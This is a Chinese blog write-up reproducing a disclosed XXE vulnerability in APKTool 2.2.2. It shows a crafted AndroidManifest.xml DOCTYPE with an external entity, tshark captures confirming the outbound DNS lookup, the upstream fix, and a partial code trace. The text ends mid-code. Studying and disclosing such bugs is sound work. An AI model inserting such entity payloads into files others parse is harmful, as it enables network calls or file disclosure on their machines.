<!DOCTYPE html>
<html>
<head>
<title>APKTool XML External Entity(XXE) Vulnerability</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<style type="text/css">
/* GitHub stylesheet for MarkdownPad (http://markdownpad.com) */
/* Author: Nicolas Hery - http://nicolashery.com */
/* Version: b13fe65ca28d2e568c6ed5d7f06581183df8f2ff */
/* Source: https://github.com/nicolahery/markdownpad-github */

/* RESET
=============================================================================*/

html, body, div, span, applet, object, iframe, h1, h2, h3, h4, h5, h6, p, blockquote, pre, a, abbr, acronym, address, big, cite, code, del, dfn, em, img, ins, kbd, q, s, samp, small, strike, strong, sub, sup, tt, var, b, u, i, center, dl, dt, dd, ol, ul, li, fieldset, form, label, legend, table, caption, tbody, tfoot, thead, tr, th, td, article, aside, canvas, details, embed, figure, figcaption, footer, header, hgroup, menu, nav, output, ruby, section, summary, time, mark, audio, video {
  margin: 0;
  padding: 0;
  border: 0;
}

/* BODY
=============================================================================*/

body {
  font-family: Helvetica, arial, freesans, clean, sans-serif;
  font-size: 14px;
  line-height: 1.6;
  color: #333;
  background-color: #fff;
  padding: 20px;
  max-width: 960px;
  margin: 0 auto;
}

body>*:first-child {
  margin-top: 0 !important;
}

body>*:last-child {
  margin-bottom: 0 !important;
}

/* BLOCKS
=============================================================================*/

p, blockquote, ul, ol, dl, table, pre {
  margin: 15px 0;
}

/* HEADERS
=============================================================================*/

h1, h2, h3, h4, h5, h6 {
  margin: 20px 0 10px;
  padding: 0;
  font-weight: bold;
  -webkit-font-smoothing: antialiased;
}

h1 tt, h1 code, h2 tt, h2 code, h3 tt, h3 code, h4 tt, h4 code, h5 tt, h5 code, h6 tt, h6 code {
  font-size: inherit;
}

h1 {
  font-size: 28px;
  color: #000;
}

h2 {
  font-size: 24px;
  border-bottom: 1px solid #ccc;
  color: #000;
}

h3 {
  font-size: 18px;
}

h4 {
  font-size: 16px;
}

h5 {
  font-size: 14px;
}

h6 {
  color: #777;
  font-size: 14px;
}

body>h2:first-child, body>h1:first-child, body>h1:first-child+h2, body>h3:first-child, body>h4:first-child, body>h5:first-child, body>h6:first-child {
  margin-top: 0;
  padding-top: 0;
}

a:first-child h1, a:first-child h2, a:first-child h3, a:first-child h4, a:first-child h5, a:first-child h6 {
  margin-top: 0;
  padding-top: 0;
}

h1+p, h2+p, h3+p, h4+p, h5+p, h6+p {
  margin-top: 10px;
}

/* LINKS
=============================================================================*/

a {
  color: #4183C4;
  text-decoration: none;
}

a:hover {
  text-decoration: underline;
}

/* LISTS
=============================================================================*/

ul, ol {
  padding-left: 30px;
}

ul li > :first-child, 
ol li > :first-child, 
ul li ul:first-of-type, 
ol li ol:first-of-type, 
ul li ol:first-of-type, 
ol li ul:first-of-type {
  margin-top: 0px;
}

ul ul, ul ol, ol ol, ol ul {
  margin-bottom: 0;
}

dl {
  padding: 0;
}

dl dt {
  font-size: 14px;
  font-weight: bold;
  font-style: italic;
  padding: 0;
  margin: 15px 0 5px;
}

dl dt:first-child {
  padding: 0;
}

dl dt>:first-child {
  margin-top: 0px;
}

dl dt>:last-child {
  margin-bottom: 0px;
}

dl dd {
  margin: 0 0 15px;
  padding: 0 15px;
}

dl dd>:first-child {
  margin-top: 0px;
}

dl dd>:last-child {
  margin-bottom: 0px;
}

/* CODE
=============================================================================*/

pre, code, tt {
  font-size: 12px;
  font-family: Consolas, "Liberation Mono", Courier, monospace;
}

code, tt {
  margin: 0 0px;
  padding: 0px 0px;
  white-space: nowrap;
  border: 1px solid #eaeaea;
  background-color: #f8f8f8;
  border-radius: 3px;
}

pre>code {
  margin: 0;
  padding: 0;
  white-space: pre;
  border: none;
  background: transparent;
}

pre {
  background-color: #f8f8f8;
  border: 1px solid #ccc;
  font-size: 13px;
  line-height: 19px;
  overflow: auto;
  padding: 6px 10px;
  border-radius: 3px;
}

pre code, pre tt {
  background-color: transparent;
  border: none;
}

kbd {
    -moz-border-bottom-colors: none;
    -moz-border-left-colors: none;
    -moz-border-right-colors: none;
    -moz-border-top-colors: none;
    background-color: #DDDDDD;
    background-image: linear-gradient(#F1F1F1, #DDDDDD);
    background-repeat: repeat-x;
    border-color: #DDDDDD #CCCCCC #CCCCCC #DDDDDD;
    border-image: none;
    border-radius: 2px 2px 2px 2px;
    border-style: solid;
    border-width: 1px;
    font-family: "Helvetica Neue",Helvetica,Arial,sans-serif;
    line-height: 10px;
    padding: 1px 4px;
}

/* QUOTES
=============================================================================*/

blockquote {
  border-left: 4px solid #DDD;
  padding: 0 15px;
  color: #777;
}

blockquote>:first-child {
  margin-top: 0px;
}

blockquote>:last-child {
  margin-bottom: 0px;
}

/* HORIZONTAL RULES
=============================================================================*/

hr {
  clear: both;
  margin: 15px 0;
  height: 0px;
  overflow: hidden;
  border: none;
  background: transparent;
  border-bottom: 4px solid #ddd;
  padding: 0;
}

/* TABLES
=============================================================================*/

table th {
  font-weight: bold;
}

table th, table td {
  border: 1px solid #ccc;
  padding: 6px 13px;
}

table tr {
  border-top: 1px solid #ccc;
  background-color: #fff;
}

table tr:nth-child(2n) {
  background-color: #f8f8f8;
}

/* IMAGES
=============================================================================*/

img {
  max-width: 100%
}
</style>
<style type="text/css">
.highlight  { background: #ffffff; }
.highlight .c { color: #999988; font-style: italic } /* Comment */
.highlight .err { color: #a61717; background-color: #e3d2d2 } /* Error */
.highlight .k { font-weight: bold } /* Keyword */
.highlight .o { font-weight: bold } /* Operator */
.highlight .cm { color: #999988; font-style: italic } /* Comment.Multiline */
.highlight .cp { color: #999999; font-weight: bold } /* Comment.Preproc */
.highlight .c1 { color: #999988; font-style: italic } /* Comment.Single */
.highlight .cs { color: #999999; font-weight: bold; font-style: italic } /* Comment.Special */
.highlight .gd { color: #000000; background-color: #ffdddd } /* Generic.Deleted */
.highlight .gd .x { color: #000000; background-color: #ffaaaa } /* Generic.Deleted.Specific */
.highlight .ge { font-style: italic } /* Generic.Emph */
.highlight .gr { color: #aa0000 } /* Generic.Error */
.highlight .gh { color: #999999 } /* Generic.Heading */
.highlight .gi { color: #000000; background-color: #ddffdd } /* Generic.Inserted */
.highlight .gi .x { color: #000000; background-color: #aaffaa } /* Generic.Inserted.Specific */
.highlight .go { color: #888888 } /* Generic.Output */
.highlight .gp { color: #555555 } /* Generic.Prompt */
.highlight .gs { font-weight: bold } /* Generic.Strong */
.highlight .gu { color: #aaaaaa } /* Generic.Subheading */
.highlight .gt { color: #aa0000 } /* Generic.Traceback */
.highlight .kc { font-weight: bold } /* Keyword.Constant */
.highlight .kd { font-weight: bold } /* Keyword.Declaration */
.highlight .kp { font-weight: bold } /* Keyword.Pseudo */
.highlight .kr { font-weight: bold } /* Keyword.Reserved */
.highlight .kt { color: #445588; font-weight: bold } /* Keyword.Type */
.highlight .m { color: #009999 } /* Literal.Number */
.highlight .s { color: #d14 } /* Literal.String */
.highlight .na { color: #008080 } /* Name.Attribute */
.highlight .nb { color: #0086B3 } /* Name.Builtin */
.highlight .nc { color: #445588; font-weight: bold } /* Name.Class */
.highlight .no { color: #008080 } /* Name.Constant */
.highlight .ni { color: #800080 } /* Name.Entity */
.highlight .ne { color: #990000; font-weight: bold } /* Name.Exception */
.highlight .nf { color: #990000; font-weight: bold } /* Name.Function */
.highlight .nn { color: #555555 } /* Name.Namespace */
.highlight .nt { color: #000080 } /* Name.Tag */
.highlight .nv { color: #008080 } /* Name.Variable */
.highlight .ow { font-weight: bold } /* Operator.Word */
.highlight .w { color: #bbbbbb } /* Text.Whitespace */
.highlight .mf { color: #009999 } /* Literal.Number.Float */
.highlight .mh { color: #009999 } /* Literal.Number.Hex */
.highlight .mi { color: #009999 } /* Literal.Number.Integer */
.highlight .mo { color: #009999 } /* Literal.Number.Oct */
.highlight .sb { color: #d14 } /* Literal.String.Backtick */
.highlight .sc { color: #d14 } /* Literal.String.Char */
.highlight .sd { color: #d14 } /* Literal.String.Doc */
.highlight .s2 { color: #d14 } /* Literal.String.Double */
.highlight .se { color: #d14 } /* Literal.String.Escape */
.highlight .sh { color: #d14 } /* Literal.String.Heredoc */
.highlight .si { color: #d14 } /* Literal.String.Interpol */
.highlight .sx { color: #d14 } /* Literal.String.Other */
.highlight .sr { color: #009926 } /* Literal.String.Regex */
.highlight .s1 { color: #d14 } /* Literal.String.Single */
.highlight .ss { color: #990073 } /* Literal.String.Symbol */
.highlight .bp { color: #999999 } /* Name.Builtin.Pseudo */
.highlight .vc { color: #008080 } /* Name.Variable.Class */
.highlight .vg { color: #008080 } /* Name.Variable.Global */
.highlight .vi { color: #008080 } /* Name.Variable.Instance */
.highlight .il { color: #009999 } /* Literal.Number.Integer.Long */
.pl-c {
    color: #969896;
}

.pl-c1,.pl-mdh,.pl-mm,.pl-mp,.pl-mr,.pl-s1 .pl-v,.pl-s3,.pl-sc,.pl-sv {
    color: #0086b3;
}

.pl-e,.pl-en {
    color: #795da3;
}

.pl-s1 .pl-s2,.pl-smi,.pl-smp,.pl-stj,.pl-vo,.pl-vpf {
    color: #333;
}

.pl-ent {
    color: #63a35c;
}

.pl-k,.pl-s,.pl-st {
    color: #a71d5d;
}

.pl-pds,.pl-s1,.pl-s1 .pl-pse .pl-s2,.pl-sr,.pl-sr .pl-cce,.pl-sr .pl-sra,.pl-sr .pl-sre,.pl-src,.pl-v {
    color: #df5000;
}

.pl-id {
    color: #b52a1d;
}

.pl-ii {
    background-color: #b52a1d;
    color: #f8f8f8;
}

.pl-sr .pl-cce {
    color: #63a35c;
    font-weight: bold;
}

.pl-ml {
    color: #693a17;
}

.pl-mh,.pl-mh .pl-en,.pl-ms {
    color: #1d3e81;
    font-weight: bold;
}

.pl-mq {
    color: #008080;
}

.pl-mi {
    color: #333;
    font-style: italic;
}

.pl-mb {
    color: #333;
    font-weight: bold;
}

.pl-md,.pl-mdhf {
    background-color: #ffecec;
    color: #bd2c00;
}

.pl-mdht,.pl-mi1 {
    background-color: #eaffea;
    color: #55a532;
}

.pl-mdr {
    color: #795da3;
    font-weight: bold;
}

.pl-mo {
    color: #1d3e81;
}
.task-list {
padding-left:10px;
margin-bottom:0;
}

.task-list li {
    margin-left: 20px;
}

.task-list-item {
list-style-type:none;
padding-left:10px;
}

.task-list-item label {
font-weight:400;
}

.task-list-item.enabled label {
cursor:pointer;
}

.task-list-item+.task-list-item {
margin-top:3px;
}

.task-list-item-checkbox {
display:inline-block;
margin-left:-20px;
margin-right:3px;
vertical-align:1px;
}
</style>
</head>
<body>
<h1 id="apktool-xml-external-entity-xxe-vulnerability">APKTool XML External Entity(XXE) Vulnerability</h1>
<p><strong>Author：Potato Couplee</strong></p>
<p>前段时间APKTool被爆出了两个漏洞，吓得我。。。。。。</p>
<p>原文在这</p>
<ul>
<li><a href="https://research.checkpoint.com/parsedroid-targeting-android-development-research-community/">https://research.checkpoint.com/parsedroid-targeting-android-development-research-community/</a></li></ul>
<p>在某天深夜，拉着困的不要不要的李神探一起分析了第一个漏洞，因为没有禁用外部实体引用导致在解析<code>AndroidManifest.xml</code>时导致的XXE攻击</p>
<p>鹅场的老师傅们说在<code>1.5.2 - 2.2.4</code>之间的版本受影响，那我们可以拿<code>2.2.2</code>来复现</p>
<p>紧跟老司机脚步学习，下载地址如下</p>
<ul>
<li><a href="https://bitbucket.org/iBotPeaches/apktool/downloads/">https://bitbucket.org/iBotPeaches/apktool/downloads/</a></li></ul>
<p>然而请同时下载准备好<code>APKTool 2.2.4</code>，不要问为什么</p>
<p>简单的写个APK，就创建工程啥都不改，然后编译签名出来，使用<code>APKTool 2.2.2</code>进行反编译，然后回编译，啥都不改，如果用的是新版本AS编译的APK是会报下面这种错误的</p>
<pre><code>wnagzihxain@toT0C:~/APKTool_XXE_Vulnerability$ java -jar apktool_2.2.2.jar d APKTool_XXE.apk -o APKTool_XXE
I: Using Apktool 2.2.2 on APKTool_XXE.apk
I: Loading resource table...
I: Decoding AndroidManifest.xml with resources...
I: Loading resource table from file: /home/wnagzihxain/.local/share/apktool/framework/1.apk
I: Regular manifest package...
I: Decoding file-resources...
I: Decoding values */* XMLs...
I: null reference: m1=0x01010540(reference), m2=0xffffffff(bool)
I: Baksmaling classes.dex...
I: Copying assets and libs...
I: Copying unknown files...
I: Copying original files...
wnagzihxain@toT0C:~/APKTool_XXE_Vulnerability$ java -jar apktool_2.2.2.jar b APKTool_XXE -o APKTool_XXE_Poc.apk
I: Using Apktool 2.2.2
I: Checking whether sources has changed...
I: Smaling smali folder into classes.dex...
I: Checking whether resources has changed...
I: Building resources...
W: res/drawable-v24/$ic_launcher_foreground__0.xml: Invalid file name: must contain only [a-zA-Z0-9_.]. Ignoring...
W: A/        ( 3762): First type is not attr!
Exception in thread &quot;main&quot; brut.androlib.AndrolibException: brut.androlib.AndrolibException: brut.common.BrutException: could not exec (exit code = 134): [/tmp/brut_util_Jar_4281020132069659160.tmp, p, --forced-package-id, 127, --min-sdk-version, 19, --target-sdk-version, 26, --version-code, 1, --version-name, 1.0, --no-version-vectors, -F, /tmp/APKTOOL3020486340330394262.tmp, -0, arsc, -0, arsc, -I, /home/wnagzihxain/.local/share/apktool/framework/1.apk, -S, /home/wnagzihxain/APKTool_XXE_Vulnerability/APKTool_XXE/res, -M, /home/wnagzihxain/APKTool_XXE_Vulnerability/APKTool_XXE/AndroidManifest.xml]
    at brut.androlib.Androlib.buildResourcesFull(Androlib.java:477)
    at brut.androlib.Androlib.buildResources(Androlib.java:411)
    at brut.androlib.Androlib.build(Androlib.java:310)
    at brut.androlib.Androlib.build(Androlib.java:263)
    at brut.apktool.Main.cmdBuild(Main.java:227)
    at brut.apktool.Main.main(Main.java:84)
Caused by: brut.androlib.AndrolibException: brut.common.BrutException: could not exec (exit code = 134): [/tmp/brut_util_Jar_4281020132069659160.tmp, p, --forced-package-id, 127, --min-sdk-version, 19, --target-sdk-version, 26, --version-code, 1, --version-name, 1.0, --no-version-vectors, -F, /tmp/APKTOOL3020486340330394262.tmp, -0, arsc, -0, arsc, -I, /home/wnagzihxain/.local/share/apktool/framework/1.apk, -S, /home/wnagzihxain/APKTool_XXE_Vulnerability/APKTool_XXE/res, -M, /home/wnagzihxain/APKTool_XXE_Vulnerability/APKTool_XXE/AndroidManifest.xml]
    at brut.androlib.res.AndrolibResources.aaptPackage(AndrolibResources.java:440)
    at brut.androlib.Androlib.buildResourcesFull(Androlib.java:463)
    ... 5 more
Caused by: brut.common.BrutException: could not exec (exit code = 134): [/tmp/brut_util_Jar_4281020132069659160.tmp, p, --forced-package-id, 127, --min-sdk-version, 19, --target-sdk-version, 26, --version-code, 1, --version-name, 1.0, --no-version-vectors, -F, /tmp/APKTOOL3020486340330394262.tmp, -0, arsc, -0, arsc, -I, /home/wnagzihxain/.local/share/apktool/framework/1.apk, -S, /home/wnagzihxain/APKTool_XXE_Vulnerability/APKTool_XXE/res, -M, /home/wnagzihxain/APKTool_XXE_Vulnerability/APKTool_XXE/AndroidManifest.xml]
    at brut.util.OS.exec(OS.java:95)
    at brut.androlib.res.AndrolibResources.aaptPackage(AndrolibResources.java:434)
    ... 6 more
</code></pre><p>关键在于</p>
<pre><code>W: A/        ( 3762): First type is not attr!
</code></pre><p>Windows和Linux同样的错误，因为我已经测过了，于是搜原因，请勿使用某度，会发现连个毛都搜不出来</p>
<p>直接找APKTool的Github Issue，非常方便的找到了</p>
<ul>
<li><a href="https://github.com/iBotPeaches/Apktool/issues/1540">https://github.com/iBotPeaches/Apktool/issues/1540</a></li></ul>
<p>大概和我的原因是一样的，作者回复这个问题其实已经解决了</p>
<pre><code>iBotPeaches commented on Jun 27
Thanks for the report, however this is a duplicate of #1520 which was also recently found in #1532 with another error.

Closing as duplicate of #1520
</code></pre><p>跟过去，很长很长，然后慢慢翻，可以看到作者从发现问题到解决问题的整个过程，以下是关键的原因，新版本AS使用<code>aapt2</code>，而APKTool使用的是<code>aapt1</code></p>
<pre><code>iBotPeaches commented on Jul 1 •  edited 
Ugh. I figured it out. Lots of work ahead of me. It appears since a related bug to this was Magisk, I took a look at their GitHub.
https://github.com/topjohnwu/MagiskManager/blob/master/gradle.properties#L25

They use aapt2, which we use aapt1 in apktool. It seems applications built in aapt2 cannot be rebuilt in aapt1 - https://developer.android.com/studio/preview/features/new-android-plugin.html

Options
Hack around these checks in aapt1 and hope it works.
Port apktool to aapt2.
</code></pre><p>接下来作者解决了这个问题，然后还给出了一个APK来给大家测试</p>
<pre><code>iBotPeaches commented on Jul 3
Okay that worked.

➜  Bug1520 apktool d app-debug.apk -f
I: Using Apktool 2.2.4-988fd1-SNAPSHOT on app-debug.apk
I: Loading resource table...
I: Decoding AndroidManifest.xml with resources...
I: Loading resource table from file: /home/ibotpeaches/.local/share/apktool/framework/1.apk
I: Regular manifest package...
I: Decoding file-resources...
I: Decoding values */* XMLs...
I: Baksmaling classes.dex...
I: Baksmaling classes2.dex...
I: Copying assets and libs...
I: Copying unknown files...
I: Copying original files...
➜  Bug1520 apktool b app-debug
I: Using Apktool 2.2.4-988fd1-SNAPSHOT
I: Checking whether sources has changed...
I: Smaling smali folder into classes.dex...
I: Checking whether sources has changed...
I: Smaling smali_classes2 folder into classes2.dex...
I: Checking whether resources has changed...
I: Building resources...
I: Building apk file...
I: Copying unknown files/dir...
➜  Bug1520 
Interesting things to notice. This is known internally as API26, the dev preview was just called preview-o, so I believe APIs are finalized. The API25 internal framework was 17.2MB, API26 is 9.2MB. I wonder if aapt2 was responsible for the smaller size.

Two incoming commits (listed above) will reference this ticket, but not close this bug. I&#39;m heading out of town, will leave it for people to confirm/test.
</code></pre><p>所以使用<code>APKTool 2.2.4</code>即可进行反编译和回编译</p>
<p>那么问题来了，<code>APKTool 2.2.4</code>并不在受影响的版本范围之内，这样测测测有个毛用啊</p>
<p>还有一个小问题，如果遇到了这个错误，直接删掉<code>AndroidManifest.xml</code>的这个属性，无伤大雅</p>
<pre><code>W: E:\test\APKTool_XXE\AndroidManifest.xml:3: error: No resource identifier found for attribute &#39;roundIcon&#39; in package &#39;android&#39;
</code></pre><p>所以呢，咋办？</p>
<p>找个以前版本的AS编译出来的应用来测一波</p>
<pre><code>wnagzihxain@toT0C:~/APKTool_XXE_Vulnerability$ java -jar apktool_2.2.2.jar d -f APKTool_XXE.apk -o APKTool_XXE
I: Using Apktool 2.2.2 on APKTool_XXE.apk
I: Loading resource table...
I: Decoding AndroidManifest.xml with resources...
I: Loading resource table from file: /home/wnagzihxain/.local/share/apktool/framework/1.apk
I: Regular manifest package...
I: Decoding file-resources...
I: Decoding values */* XMLs...
I: Baksmaling classes.dex...
I: Copying assets and libs...
I: Copying unknown files...
I: Copying original files...
wnagzihxain@toT0C:~/APKTool_XXE_Vulnerability$ java -jar apktool_2.2.2.jar b -f APKTool_XXE -o APKTool_XXE_Poc.apk
I: Using Apktool 2.2.2
I: Smaling smali folder into classes.dex...
I: Building resources...
I: Building apk file...
I: Copying unknown files/dir...
</code></pre><p>打开<code>AndroidManifest.xml</code>，我们加上一句，然后在中间进行调用<code>&amp;xxe;</code></p>
<pre><code>&lt;!DOCTYPE manifest [&lt;!ENTITY xxe SYSTEM &#39;http://couplee.wang;&#39;&gt;]&gt;
</code></pre><p>大概像这样</p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; standalone=&quot;no&quot;?&gt;
&lt;!DOCTYPE manifest [&lt;!ENTITY xxe SYSTEM &#39;http://couplee.wang;&#39;&gt;]&gt;
&lt;manifest xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; package=&quot;com.wnagzihxain.application&quot; platformBuildVersionCode=&quot;25&quot; platformBuildVersionName=&quot;7.1.1&quot;&gt;
    &amp;xxe;
    &lt;meta-data android:name=&quot;android.support.VERSION&quot; android:value=&quot;25.3.1&quot;/&gt;
    &lt;application android:allowBackup=&quot;true&quot; android:icon=&quot;@mipmap/ic_launcher&quot; android:label=&quot;@string/app_name&quot; android:roundIcon=&quot;@mipmap/ic_launcher_round&quot; android:supportsRtl=&quot;true&quot; android:theme=&quot;@style/AppTheme&quot;&gt;
        &lt;activity android:name=&quot;com.wnagzihxain.application.MainActivity&quot;&gt;
            &lt;intent-filter&gt;
                &lt;action android:name=&quot;android.intent.action.MAIN&quot;/&gt;
                &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot;/&gt;
            &lt;/intent-filter&gt;
        &lt;/activity&gt;
    &lt;/application&gt;
&lt;/manifest&gt;
</code></pre><p>尝试回编译</p>
<pre><code>wnagzihxain@toT0C:~/APKTool_XXE_Vulnerability$ java -jar apktool_2.2.2.jar b -f APKTool_XXE -o APKTool_XXE_Poc.apk
I: Using Apktool 2.2.2
I: Smaling smali folder into classes.dex...
I: Building resources...
I: Building apk file...
I: Copying unknown files/dir...
</code></pre><p>看到停在那里不动的那一刻，我的小心脏~~~</p>
<p>好在还是回编译完成了，使用tshark来查看流量，没安装的同学可以先安装</p>
<pre><code>wnagzihxain@toT0C:~$ sudo apt install tshark
</code></pre><p>先查看可使用的网卡</p>
<pre><code>wnagzihxain@toT0C:~$ sudo tshark -D
Running as user &quot;root&quot; and group &quot;root&quot;. This could be dangerous.
tshark: Lua: Error during loading:
 [string &quot;/usr/share/wireshark/init.lua&quot;]:44: dofile has been disabled due to running Wireshark as superuser. See https://wiki.wireshark.org/CaptureSetup/CapturePrivileges for help in running Wireshark as an unprivileged user.
1. ens33
2. any
3. lo (Loopback)
4. nflog
5. nfqueue
6. usbmon1
7. usbmon2
8. cisco (Cisco remote capture)
9. randpkt (Random packet generator)
10. ssh (SSH remote capture)
</code></pre><p>查看网卡，结合上面确认是<code>ens33</code></p>
<pre><code>wnagzihxain@toT0C:~$ ifconfig
ens33     Link encap:以太网  硬件地址 00:0c:29:07:15:e0  
          inet 地址:192.168.121.133  广播:192.168.121.255  掩码:255.255.255.0
          inet6 地址: fe80::1483:9e:a6ec:3400/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  跃点数:1
          接收数据包:41821 错误:12 丢弃:0 过载:0 帧数:0
          发送数据包:28268 错误:0 丢弃:0 过载:0 载波:0
          碰撞:0 发送队列长度:1000 
          接收字节:44857243 (44.8 MB)  发送字节:2126689 (2.1 MB)
          中断:19 基本地址:0x2000 

lo        Link encap:本地环回  
          inet 地址:127.0.0.1  掩码:255.0.0.0
          inet6 地址: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  跃点数:1
          接收数据包:2960 错误:0 丢弃:0 过载:0 帧数:0
          发送数据包:2960 错误:0 丢弃:0 过载:0 载波:0
          碰撞:0 发送队列长度:1000 
          接收字节:285395 (285.3 KB)  发送字节:285395 (285.3 KB)
</code></pre><p>开启监听，就不过滤具体地址了</p>
<pre><code>wnagzihxain@toT0C:~$ sudo tshark -i ens33 -f &quot;port 53&quot;
Running as user &quot;root&quot; and group &quot;root&quot;. This could be dangerous.
tshark: Lua: Error during loading:
 [string &quot;/usr/share/wireshark/init.lua&quot;]:44: dofile has been disabled due to running Wireshark as superuser. See https://wiki.wireshark.org/CaptureSetup/CapturePrivileges for help in running Wireshark as an unprivileged user.
Capturing on &#39;ens33&#39;
</code></pre><p>然后执行回编译</p>
<pre><code>wnagzihxain@toT0C:~/APKTool_XXE_Vulnerability$ java -jar apktool_2.2.2.jar b APKTool_XXE -o APKTool_XXE_Poc.ap
I: Using Apktool 2.2.2
I: Checking whether sources has changed...
I: Checking whether resources has changed...
I: Building resources...
I: Building apk file...
I: Copying unknown files/dir...
</code></pre><p>捕获到了DNS解析流量，可以看到确实是访问了，换句话说就是：执行命令了</p>
<pre><code>wnagzihxain@toT0C:~$ sudo tshark -i ens33 -f &quot;port 53&quot;
Running as user &quot;root&quot; and group &quot;root&quot;. This could be dangerous.
tshark: Lua: Error during loading:
 [string &quot;/usr/share/wireshark/init.lua&quot;]:44: dofile has been disabled due to running Wireshark as superuser. See https://wiki.wireshark.org/CaptureSetup/CapturePrivileges for help in running Wireshark as an unprivileged user.
Capturing on &#39;ens33&#39;
    1 0.000000000 192.168.121.133 → 192.168.121.2 DNS 73 Standard query 0xbf88 A couplee.wang;
    2 0.000170879 192.168.121.133 → 192.168.121.2 DNS 73 Standard query 0xf043 AAAA couplee.wang;
    3 0.028609824 192.168.121.2 → 192.168.121.133 DNS 148 Standard query response 0xbf88 No such name A couplee.wang; SOA a.root-servers.net
    4 0.035819090 192.168.121.2 → 192.168.121.133 DNS 148 Standard query response 0xf043 No such name AAAA couplee.wang; SOA a.root-servers.net
    5 0.036051324 192.168.121.133 → 192.168.121.2 DNS 85 Standard query 0xa964 A couplee.wang;.localdomain
    6 0.036177523 192.168.121.133 → 192.168.121.2 DNS 85 Standard query 0xfaa3 AAAA couplee.wang;.localdomain
    7 0.085708002 192.168.121.2 → 192.168.121.133 DNS 160 Standard query response 0xfaa3 No such name AAAA couplee.wang;.localdomain SOA a.root-servers.net
    8 5.040568497 192.168.121.133 → 192.168.121.2 DNS 85 Standard query 0xa964 A couplee.wang;.localdomain
    9 10.044344674 192.168.121.133 → 192.168.121.2 DNS 85 Standard query 0xa964 A couplee.wang;.localdomain
</code></pre><p>大概整个过程如下图</p>
<p><img src="Image/1.png" alt=""></p>
<p>然后我们来看作者的修复，其实修复很简单，禁用外部实体引用即可</p>
<ul>
<li><a href="https://github.com/iBotPeaches/Apktool/commit/f19317d87c316ed254aafa0a27eddd024e25ec6c#diff-84f49a5539f89dd92ae7ff22216416d9">https://github.com/iBotPeaches/Apktool/commit/f19317d87c316ed254aafa0a27eddd024e25ec6c#diff-84f49a5539f89dd92ae7ff22216416d9</a></li></ul>
<p>两个添加代码的位置</p>
<pre><code>@@ -246,6 +246,8 @@ private static Document loadDocument(File file)
              throws IOException, SAXException, ParserConfigurationException {

          DocumentBuilderFactory docFactory = DocumentBuilderFactory.newInstance();
 +        docFactory.setFeature(FEATURE_DISABLE_DOCTYPE_DECL, true);
 +
          DocumentBuilder docBuilder = docFactory.newDocumentBuilder();
          return docBuilder.parse(file);
      }
 @@ -264,10 +266,10 @@ private static void saveDocument(File file, Document doc)

          TransformerFactory transformerFactory = TransformerFactory.newInstance();
          Transformer transformer = transformerFactory.newTransformer();
 -        transformer.setOutputProperty(OutputKeys.INDENT, &quot;yes&quot;);
 -        transformer.setOutputProperty(OutputKeys.STANDALONE,&quot;yes&quot;);
          DOMSource source = new DOMSource(doc);
          StreamResult result = new StreamResult(file);
          transformer.transform(source, result);
      }
 +
 +    private static final String FEATURE_DISABLE_DOCTYPE_DECL = &quot;http://apache.org/xml/features/disallow-doctype-decl&quot;;
  }
</code></pre><p>主要是这两句</p>
<pre><code>+    docFactory.setFeature(FEATURE_DISABLE_DOCTYPE_DECL, true);
+    private static final String FEATURE_DISABLE_DOCTYPE_DECL = &quot;http://apache.org/xml/features/disallow-doctype-decl&quot;;
</code></pre><p>可以看到<code>APKTool 2.2.4</code>开始已经修复了这个问题，当我们插入外部实体引用的时候，就会提示下面那句话</p>
<pre><code>wnagzihxain@toT0C:~/APKTool_XXE_Vulnerability$ java -jar apktool_2.2.4.jar b -f APKTool_XXE -o APKTool_XXE_Poc.apk
I: Using Apktool 2.2.4
I: Smaling smali folder into classes.dex...
[Fatal Error] :2:10: 将功能 &quot;http://apache.org/xml/features/disallow-doctype-decl&quot; 设置为“真”时, 不允许使用 DOCTYPE。
I: Building resources...
I: Building apk file...
I: Copying unknown files/dir...
</code></pre><p>在测完了这个之后，我开始好奇<code>ShakaApktool</code>是否存在同样的问题</p>
<p>该项目的地址</p>
<ul>
<li><a href="https://github.com/rover12421/ShakaApktool">https://github.com/rover12421/ShakaApktool</a></li></ul>
<p>下载最新版本的ShakaApkTool，重复上面的过程</p>
<p>经过测试最新版本，同样存在漏洞（为什么感觉这个好像没有人报呢？）</p>
<p><img src="Image/2.png" alt=""></p>
<p>在整个过程复现完成后，我们来跟踪一下<code>AndroidManifest.xml</code>是如何回编译的，观察在哪里触发了漏洞</p>
<p>首先是从<code>Main.java</code>开始，通过对<code>d</code>还是<code>b</code>的判断区分是反编译还是回编译</p>
<pre><code>if (opt.equalsIgnoreCase(&quot;d&quot;) || opt.equalsIgnoreCase(&quot;decode&quot;)) {
    cmdDecode(commandLine);
    cmdFound = true;
} else if (opt.equalsIgnoreCase(&quot;b&quot;) || opt.equalsIgnoreCase(&quot;build&quot;)) {
    cmdBuild(commandLine);
    cmdFound = true;
}
</code></pre><p>如果是<code>b</code>，则会调用<code>cmdBuild(commandLine)</code>进行其余参数的判断</p>
<pre><code>private static void cmdBuild(CommandLine cli) throws BrutException {
    String[] args = cli.getArgs();
    String appDirName = args.length &lt; 2 ? &quot;.&quot; : args[1];
    File outFile;
    ApkOptions apkOptions = new ApkOptions();

    // check for build options
    if (cli.hasOption(&quot;f&quot;) || cli.hasOption(&quot;force-all&quot;)) {
        apkOptions.forceBuildAll = true;
    }
    if (cli.hasOption(&quot;d&quot;) || cli.hasOption(&quot;debug&quot;)) {
        System.out.println(&quot;SmaliDebugging has been removed in 2.1.0 onward. Please see: https://github.com/iBotPeaches/Apktool/issues/1061&quot;);
        apkOptions.debugMode = true;
    }
    if (cli.hasOption(&quot;v&quot;) || cli.hasOption(&quot;verbose&quot;)) {
        apkOptions.verbose = true;
    }
    if (cli.hasOption(&quot;a&quot;) || cli.hasOption(&quot;aapt&quot;)) {
        apkOptions.aaptPath = cli.getOptionValue(&quot;a&quot;);
    }
    if (cli.hasOption(&quot;c&quot;) || cli.hasOption(&quot;copy-original&quot;)) {
        apkOptions.copyOriginalFiles = true;
    }
    if (cli.hasOption(&quot;p&quot;) || cli.hasOption(&quot;frame-path&quot;)) {
        apkOptions.frameworkFolderLocation = cli.getOptionValue(&quot;p&quot;);
    }
    if (cli.hasOption(&quot;o&quot;) || cli.hasOption(&quot;output&quot;)) {
